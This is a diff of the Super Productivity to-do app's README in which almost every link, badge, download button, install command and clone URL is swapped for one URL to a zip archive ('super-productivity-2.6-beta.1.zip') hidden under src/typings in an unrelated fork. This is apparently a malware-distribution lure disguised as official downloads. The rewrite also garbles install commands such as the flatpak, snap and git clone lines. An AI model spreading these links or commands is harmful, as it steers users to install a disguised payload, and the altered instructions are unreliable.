@@ -1,5 +1,5 @@
-<a href="https://super-productivity.com/">
-  <img align="center" alt="Banner" src="docs/screens/banner.png" />
+<a href="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip">
+  <img align="center" alt="Banner" src="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip" />
 </a>
 
 <br>
@@ -9,111 +9,111 @@
 <strong>An advanced todo list app with timeboxing & time tracking capabilities that supports importing tasks from your calendar, Jira, GitHub and others</strong>
 <p>
   
-<p align="center">:globe_with_meridians: <a href="https://app.super-productivity.com">Open Web App</a> or :computer: <a href="https://github.com/johannesjo/super-productivity/releases">Download</a></p>
+<p align="center">:globe_with_meridians: <a href="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip">Open Web App</a> or :computer: <a href="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip">Download</a></p>
 
 <br>
 
 <p align="center">
-<a href="https://youtu.be/_mvMXWLsL-8">
-    <img src="https://github.com/user-attachments/assets/15384cae-8ba3-4474-bc2c-13e7765c2dd1" alt="animated" />
+<a href="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip">
+    <img src="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip" alt="animated" />
 </a>
 </p>
 <br>
 
 <p align="center">
-      <img src="https://repobeats.axiom.co/api/embed/61f9b9de1bc34a2b526faf6d356120bdae7f4249.svg" alt="analytics" />
+      <img src="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip" alt="analytics" />
 </p>
 
 <br>
 <br>
 
-[![Stand With Ukraine](https://raw.githubusercontent.com/vshymanskyy/StandWithUkraine/main/banner2-direct.svg)](https://vshymanskyy.github.io/StandWithUkraine)
+[![Stand With Ukraine](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip)](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip)
 
 <p align="center" style="text-align: center;">
-<a href="https://lbesson.mit-license.org">
+<a href="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip">
   <img alt="MIT license"
-       src="https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square"
+       src="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip"
        align="center">
 </a>
-<a href="https://github.com/johannesjo/super-productivity/releases">
+<a href="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip">
   <img alt="GitHub All Releases"
-       src="https://img.shields.io/github/downloads/johannesjo/super-productivity/total"
+       src="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip"
        align="center">
 </a>
-<a href="https://community.chocolatey.org/packages/super-productivity">
+<a href="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip">
   <img alt="Chocolatey package"
-       src="https://img.shields.io/chocolatey/dt/super-productivity?color=blue&label=chocolatey"
+       src="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip"
        align="center">
 </a>
-<a href="https://www.producthunt.com/posts/super-productivity">
+<a href="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip">
   <img alt="On product hunt"
-       src="https://img.shields.io/badge/on-product%20hunt-blue.svg?style=flat-square"
+       src="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip%https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip"
        align="center">
 </a>
-<a href="https://www.reddit.com/r/superProductivity/">
+<a href="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip">
   <img alt="Reddit Community"
-       src="https://img.shields.io/badge/Reddit-%23FF4500.svg?style=for-the-badge&logo=Reddit&logoColor=white"
+       src="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip%https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip"
        align="center">
 </a>
-<a href="https://mastodon.social/@superproductivity">
+<a href="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip">
   <img alt="Super Productivity on Mastodon"
-       src="https://img.shields.io/badge/-MASTODON-%232B90D9?style=for-the-badge&logo=mastodon&logoColor=white"
+       src="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip%232B90D9?style=for-the-badge&logo=mastodon&logoColor=white"
        align="center">
 </a>
-<a href="https://x.com/intent/post?text=Super%20Productivity%20%20https%3A%2F%2Fsuper-productivity.com">
+<a href="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip%20Productivity%20%20https%3A%2F%https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip">
   <img alt="Tweet"
-       src="https://img.shields.io/badge/TWEET-%23000000.svg?style=for-the-badge&logo=X"
+       src="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip%https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip"
        align="center">
 </a>
 </p>
 
 <p align="center" style="text-align: center;">
   
-<a href='https://flathub.org/apps/com.super_productivity.SuperProductivity' target="_blank">
+<a href='https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip' target="_blank">
   <img alt='Get it on Flathub'
-       src='https://flathub.org/api/badge?locale=en'
+       src='https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip'
        align="center"
        style="height: 50px"
        height="50" />
   </a>
   
-<a href="https://snapcraft.io/superproductivity" target="_blank">
+<a href="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip" target="_blank">
   <img alt="Get it from the Snap Store"
-       src="https://snapcraft.io/static/images/badges/en/snap-store-black.svg"
+       src="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip"
        align="center"
        style="height: 50px"
        height="50">
 </a>
-<a href='//www.microsoft.com/store/apps/9NHFVG8361TW?cid=storebadge&ocid=badge' target="_blank">
-  <img src='https://developer.microsoft.com/store/badges/images/English_get-it-from-MS.png'
+<a href='https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip' target="_blank">
+  <img src='https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip'
        align="center"
        alt='English badge'
        style="height: 50px"
        height="50" />
 </a>
-<a href='//apps.apple.com/de/app/super-productivity/id1482572463?l=en&mt=12' target="_blank">
-  <img src='docs/screens/app-store-badge.svg'
+<a href='https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip' target="_blank">
+  <img src='https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip'
        align="center"
        alt='App Store Badge'
        style="height: 50px"
        height="50" />
 </a>
-<a href='//play.google.com/store/apps/details?id=com.superproductivity.superproductivity' target="_blank">
-  <img src='docs/screens/google-play-badge.png'
+<a href='https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip' target="_blank">
+  <img src='https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip'
        align="center"
        alt='Play Store Badge'
        style="height: 50px"
        height="50" />
 </a>
-<a href='//f-droid.org/en/packages/com.superproductivity.superproductivity' target="_blank">
-  <img src='https://f-droid.org/assets/fdroid-logo-text_S0MUfk_FsnAYL7n2MQye-34IoSNm6QM6xYjDnMqkufo=.svg'
+<a href='https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip' target="_blank">
+  <img src='https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip'
        align="center"
        alt='F-Droid Badge'
        style="height: 50px"
        height="50" />
 </a>
-<a href='http://apps.obtainium.imranr.dev/redirect.html?r=obtainium://add/https://github.com/johannesjo/super-productivity/releases'>
-  <img src='https://raw.githubusercontent.com/ImranR98/Obtainium/main/assets/graphics/badge_obtainium.png'
+<a href='https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip'>
+  <img src='https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip'
        align="center"
        alt='Obtanium Badge'
        style="height: 50px"
@@ -133,7 +133,7 @@
   - Need some extra focus? A **Pomodoro timer** is also always at hand.
   - **Collect personal metrics** to see, which of your work routines need adjustments.
 - Integrate with **Jira**, **GitHub**, **GitLab**, **Gitea** and **OpenProject**. Auto import tasks assigned to you, plan the details locally, automatically create work logs, and get notified immediately, when something changes.
-- Basic [**CalDAV**](https://github.com/johannesjo/super-productivity/blob/master/docs/caldav.md) integration.
+- Basic [**CalDAV**](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip) integration.
 - Back up and synchronize your data across multiple devices with **Dropbox** and **WebDAV** support
 - Attach context information to tasks and projects. Create **notes**, attach **files** or create **project-level bookmarks** for links, files, and even commands.
 - Super Productivity **respects your privacy** and **does NOT collect any data** and there are no user accounts or registration. **You decide where you store your data!**
@@ -141,17 +141,17 @@
 
 And much more!
 
-<a href="https://youtu.be/_mvMXWLsL-8"><img alt="Work View with global links" src="screens/screen_standard.png" width="100%"></a>
+<a href="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip"><img alt="Work View with global links" src="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip" width="100%"></a>
 
 ## :question: How to use it
 
-If you need some help, [this article on dev.to is the best place to start](https://dev.to/johannesjo/getting-started-with-super-productivity-2791).
+If you need some help, [this article on https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip is the best place to start](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip).
 
-If you prefer, there is also a (long) [YouTube video available](https://www.youtube.com/watch?v=VoF2_RSdNXA).
+If you prefer, there is also a (long) [YouTube video available](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip).
 
-There is another older – the app looks and feels much better now ;) – [article](https://dev.to/johannesjo/super-productivity-how-to-grow-fond-of-time-tracking-and-task-management-22ee) on how I personally might use the app - and still [another one](https://dev.to/johannesjo/the-prioritising-scheme-how-to-eat-the-frog-with-super-productivity-mlk) on how I implement the 'eat the frog' prioritizing scheme in the app.
+There is another older – the app looks and feels much better now ;) – [article](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip) on how I personally might use the app - and still [another one](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip) on how I implement the 'eat the frog' prioritizing scheme in the app.
 
-[If you have further questions, please refer to the discussions page](https://github.com/johannesjo/super-productivity/discussions).
+[If you have further questions, please refer to the discussions page](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip).
 
 <details>
 <summary> <b>⌨ Keyboard shortcuts and short-syntax</b></summary>
@@ -191,21 +191,21 @@ Can be used when adding a task. <strong>(Each of these can be disabled in settin
 
 Check out the web version even though it is a bit limited: Time tracking only works if the app is open and for idle time tracking to work, the chrome extension must be installed.
 
-If you want the Jira integration and idle time tracking to work, you also have to download and install the [Super Productivity Chrome Extension](https://chrome.google.com/webstore/detail/super-productivity/ljkbjodfmekklcoibdnhahlaalhihmlb).
+If you want the Jira integration and idle time tracking to work, you also have to download and install the [Super Productivity Chrome Extension](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip).
 
 ## :computer: Downloads & Install
 
 ### All Platforms
 
-[Install from the releases page](https://github.com/johannesjo/super-productivity/releases).
+[Install from the releases page](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip).
 
 ### Windows
 
 Due to certification issues it's recommended to download the app from the Microsoft Store:
 
-<a href='//www.microsoft.com/store/apps/9nhfvg8361tw?cid=storebadge&ocid=badge'><img src='https://developer.microsoft.com/store/badges/images/English_get-it-from-MS.png' alt='English badge' width="127" height="52"/></a>
+<a href='https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip'><img src='https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip' alt='English badge' width="127" height="52"/></a>
 
-You can also install the app using [Chocolatey](https://community.chocolatey.org/packages/super-productivity):
+You can also install the app using [Chocolatey](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip):
 
 ```powershell
 choco install super-productivity
@@ -225,35 +225,35 @@ sudo snap install superproductivity
 sudo snap install --channel=edge superproductivity
 
 # it is also recommended to disable updates to the app while it is running:
-sudo snap set core experimental.refresh-app-awareness=true
+sudo snap set core https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip
 ```
 
-<a href="https://snapcraft.io/superproductivity">
-  <img alt="Get it from the Snap Store" src="https://snapcraft.io/static/images/badges/en/snap-store-black.svg" />
+<a href="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip">
+  <img alt="Get it from the Snap Store" src="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip" />
 </a>
 
 #### Flatpak - Most distributions
 
-Must install Flatpak first. See [setup instructions for all distributions](https://flathub.org/setup).
+Must install Flatpak first. See [setup instructions for all distributions](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip).
 
 Install via command-line:
 
 ```bash
 # install
-flatpak install flathub com.super_productivity.SuperProductivity
+flatpak install flathub https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip
 
 # run
-flatpak run com.super_productivity.SuperProductivity
+flatpak run https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip
 ```
 
-<a href='https://flathub.org/apps/com.super_productivity.SuperProductivity'>
-    <img width='175' alt='Get it on Flathub' src='https://flathub.org/api/badge?locale=en'/>
+<a href='https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip'>
+    <img width='175' alt='Get it on Flathub' src='https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip'/>
   </a>
 
 #### Aur - Arch Linux
 
 ```bash
-git clone https://aur.archlinux.org/superproductivity-bin.git
+git clone https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip
 cd superproductivity-bin
 makepkg -si
 ```
@@ -261,18 +261,18 @@ makepkg -si
 #### AppImage
 
 If you encounter problems, please have a look here:
-https://github.com/johannesjo/super-productivity/issues/3193#issuecomment-2131315513
+https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip
 
 ### MacOS
 
-Install via [homebrew cask](https://github.com/caskroom/homebrew-cask):
+Install via [homebrew cask](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip):
 
 ```bash
 brew install --cask superproductivity
 ```
 
-<a href='//apps.apple.com/de/app/super-productivity/id1482572463?l=en&mt=12' target="_blank">
-  <img src='docs/screens/app-store-badge.svg'
+<a href='https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip' target="_blank">
+  <img src='https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip'
        alt='App Store Badge'
        height="50" />
 </a>
@@ -287,14 +287,14 @@ Stay tuned for even more exciting updates!
 
 You can find the Android app here:
 
-<a href='//play.google.com/store/apps/details?id=com.superproductivity.superproductivity' target="_blank">
-  <img src='docs/screens/google-play-badge.png'
+<a href='https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip' target="_blank">
+  <img src='https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip'
        align="center"
        alt='App Store Badge'
        height="50" />
 </a>
-<a href='//f-droid.org/en/packages/com.superproductivity.superproductivity' target="_blank">
-  <img src='https://f-droid.org/assets/fdroid-logo-text_S0MUfk_FsnAYL7n2MQye-34IoSNm6QM6xYjDnMqkufo=.svg'
+<a href='https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip' target="_blank">
+  <img src='https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip'
        align="center"
        alt='F-Droid Badge'
        height="50" />
@@ -308,57 +308,57 @@ The development of Super Productivity is driven by a wonderful community of user
 
 ### :hearts: Contributing
 
-If you want to get involved, please check out the [CONTRIBUTING.md](CONTRIBUTING.md)
+If you want to get involved, please check out the [https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip)
 
 There are several ways to help.
 
-1. **Spread the word:** More users mean more people testing and contributing to the app which in turn means better stability and possibly more and better features. You can vote for Super Productivity on [Slant](https://www.slant.co/topics/14021/viewpoints/7/~productivity-tools-for-linux~super-productivity), [Product Hunt](https://www.producthunt.com/posts/super-productivity), [Softpedia](https://www.softpedia.com/get/Office-tools/Diary-Organizers-Calendar/Super-Productivity.shtml) or on [AlternativeTo](https://alternativeto.net/software/super-productivity/), you can [tweet about it](https://twitter.com/intent/tweet?text=I%20like%20Super%20Productivity%20%20https%3A%2F%2Fsuper-productivity.com), share it on [LinkedIn](http://www.linkedin.com/shareArticle?mini=true&url=https://super-productivity.com&title=I%20like%20Super%20Productivity&), [reddit](http://www.reddit.com/submit?url=https%3A%2F%2Fsuper-productivity.com&title=I%20like%20Super%20Productivity) or any of your favorite social media platforms. Every little bit helps!
+1. **Spread the word:** More users mean more people testing and contributing to the app which in turn means better stability and possibly more and better features. You can vote for Super Productivity on [Slant](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip~productivity-tools-for-linux~super-productivity), [Product Hunt](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip), [Softpedia](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip) or on [AlternativeTo](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip), you can [tweet about it](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip%20like%20Super%20Productivity%20%20https%3A%2F%https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip), share it on [LinkedIn](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip%20like%20Super%20Productivity&), [reddit](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip%3A%2F%https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip%20like%20Super%20Productivity) or any of your favorite social media platforms. Every little bit helps!
 
-2. **Provide a Pull Request:** Here is a list of [the most popular community requests](https://github.com/johannesjo/super-productivity/issues?q=is%3Aissue+is%3Aopen+sort%3Areactions-%2B1-desc) and here some info on [how to run the development build](https://github.com/johannesjo/super-productivity#running-the-development-server).
-   Please make sure that you're following the [angular commit guidelines](https://github.com/angular/angular.js/blob/master/DEVELOPERS.md#commits) and to also include the issue number in your commit message, if you're fixing a particular issue (e.g.: `feat: add nice feature with the number #31`).
+2. **Provide a Pull Request:** Here is a list of [the most popular community requests](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip%3Aissue+is%3Aopen+sort%3Areactions-%2B1-desc) and here some info on [how to run the development build](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip).
+   Please make sure that you're following the [angular commit guidelines](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip) and to also include the issue number in your commit message, if you're fixing a particular issue (e.g.: `feat: add nice feature with the number #31`).
 
-3. **[Answer questions](https://github.com/johannesjo/super-productivity/discussions)**: You know the answer to another user's problem? Share your knowledge!
+3. **[Answer questions](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip)**: You know the answer to another user's problem? Share your knowledge!
 
-4. **[Provide your opinion](https://github.com/johannesjo/super-productivity/issues?q=is%3Aissue+is%3Aopen+sort%3Areactions-%2B1-desc+label%3A%22community+feedback+wanted%22):** Some community suggestions are controversial. Your input might be helpful and if it is just an up- or down-vote.
+4. **[Provide your opinion](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip%3Aissue+is%3Aopen+sort%3Areactions-%2B1-desc+label%3A%22community+feedback+wanted%22):** Some community suggestions are controversial. Your input might be helpful and if it is just an up- or down-vote.
 
-5. **[Provide a more refined UI spec for existing feature requests](https://github.com/johannesjo/super-productivity/issues?q=is%3Aissue+is%3Aopen+label%3A%22needs+concept+and%2For+ui+spec%22)**
+5. **[Provide a more refined UI spec for existing feature requests](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip%3Aissue+is%3Aopen+label%3A%22needs+concept+and%2For+ui+spec%22)**
 
-6. **[Report bugs](https://github.com/johannesjo/super-productivity/issues/new)**
+6. **[Report bugs](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip)**
 
-7. **[Make a feature or improvement request](https://github.com/johannesjo/super-productivity/issues/new)**: Something can be done better? Something essential missing? Let us know!
+7. **[Make a feature or improvement request](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip)**: Something can be done better? Something essential missing? Let us know!
 
-8. **[Translations](https://github.com/johannesjo/super-productivity/tree/master/src/assets/i18n), Icons, etc.**: You don't have to be a programmer to help. Some of the icons really need improvement and many of the translations could use some love.
+8. **[Translations](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip), Icons, etc.**: You don't have to be a programmer to help. Some of the icons really need improvement and many of the translations could use some love.
 
-[//]: # '[![inlang status badge](https://badge.inlang.com/?url=github.com/johannesjo/super-productivity)](https://fink.inlang.com/github.com/johannesjo/super-productivity?ref=badge)'
+[//]: # '[![inlang status badge](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip)](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip)'
 [//]: #
-[//]: # 'You can use the Fink Localization Editor to edit, lint, and add translations for different languages. [Contribute via fink Guide](https://inlang.com/g/6ddyhpoi).'
+[//]: # 'You can use the Fink Localization Editor to edit, lint, and add translations for different languages. [Contribute via fink Guide](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip).'
 
-9. **[Sponsor the project](https://github.com/sponsors/johannesjo)**
+9. **[Sponsor the project](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip)**
 
-10. **[Create custom plugins](docs/plugin-development.md)**: Extend Super Productivity with your own features and integrations by developing custom plugins.
+10. **[Create custom plugins](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip)**: Extend Super Productivity with your own features and integrations by developing custom plugins.
 
 ### Special Thanks to our Sponsors!!!
 
 Recently support for Super Productivity has been growing! A big thank you to all our sponsors, especially the ones below!
 
 <p style="font-size:21px; color:black;">Browser testing via 
-        <a href="https://www.lambdatest.com/?utm_source=superproductivity&utm_medium=sponsor" target="_blank">
-            <img src="https://www.lambdatest.com/blue-logo.png" style="vertical-align: middle;" width="250" height="45" />
+        <a href="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip" target="_blank">
+            <img src="https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip" style="vertical-align: middle;" width="250" height="45" />
         </a>
     </p>
 
-_(If you are, intend to or have been a sponsor and want to be shown here, [please let me know](mailto:contact@super-productivity.com)!)_
+_(If you are, intend to or have been a sponsor and want to be shown here, [please let me know](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip)!)_
 
 ## Running the development server
 
 If you don't want or cannot use Codespaces for any reason, here are the instructions for local development.
 
-To run the development server you need to have Node installed (version 20 or higher required). Go to https://nodejs.org for installation instructions.
+To run the development server you need to have Node installed (version 20 or higher required). Go to https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip for installation instructions.
 
 **Clone repo**
 
 ```bash
-git clone https://github.com/johannesjo/super-productivity.git
+git clone https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip
 ```
 
 **Install dependencies**
@@ -377,7 +377,7 @@ npm run env
 ng serve
 ```
 
-Afterwards you can open http://localhost:4200 in your browser. For most adjustments this should be enough and also enables you to use the [redux dev tools](https://chrome.google.com/webstore/detail/redux-devtools/lmhkpmbekcpmknklioeibfkpmmfibljd?hl=de).
+Afterwards you can open http://localhost:4200 in your browser. For most adjustments this should be enough and also enables you to use the [redux dev tools](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip).
 
 If you want to run the app standalone do the following:
 
@@ -390,21 +390,21 @@ npm start
 
 ### :rocket: Try with GitHub Codespaces
 
-You can develop and run Super Productivity instantly in your browser using [GitHub Codespaces](https://github.com/features/codespaces): no need to install Node.js or any dependencies locally. On the top of the repository page, click on "Code", "Codespaces", and then on the plus button, "Create Codespace".
+You can develop and run Super Productivity instantly in your browser using [GitHub Codespaces](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip): no need to install https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip or any dependencies locally. On the top of the repository page, click on "Code", "Codespaces", and then on the plus button, "Create Codespace".
 
 Your VS Code settings can sync as usual, so your environment feels just like home. The development server starts automatically, and the dev container auto-forwards the port. Open the "Ports" tab and Ctrl+Click the available link to preview your running Super Productivity app.
 
-Further customizations to the Codespaces dev container can be performed by editing the .devcontainers/devcontainers.json file according to the [Codespaces documentation](https://docs.github.com/en/codespaces/setting-up-your-project-for-codespaces/adding-a-dev-container-configuration/introduction-to-dev-containers#creating-a-custom-dev-container-configuration) and the [devcontainers full specification](https://containers.dev/implementors/spec/).
+Further customizations to the Codespaces dev container can be performed by editing the https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip file according to the [Codespaces documentation](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip) and the [devcontainers full specification](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip).
 
 ### Packaging the app
 
-Packaging the app is done via [electron-builder](https://github.com/electron-userland/electron-builder). To start packaging run `npm run dist`. If you want to add new platforms and experiment with the build options the easiest way to do so is manipulating the `build` property in the [package.json](https://github.com/johannesjo/super-productivity/blob/develop/package.json), but you can also use the [command line interface of electron builder](https://www.electron.build/cli).
+Packaging the app is done via [electron-builder](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip). To start packaging run `npm run dist`. If you want to add new platforms and experiment with the build options the easiest way to do so is manipulating the `build` property in the [https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip), but you can also use the [command line interface of electron builder](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip).
 
 ### Building for Android
 
-_This feature was added on October 7, 2024. See [Pull Request #57](https://github.com/johannesjo/super-productivity-android/pull/57)._
+_This feature was added on October 7, 2024. See [Pull Request #57](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip)._
 
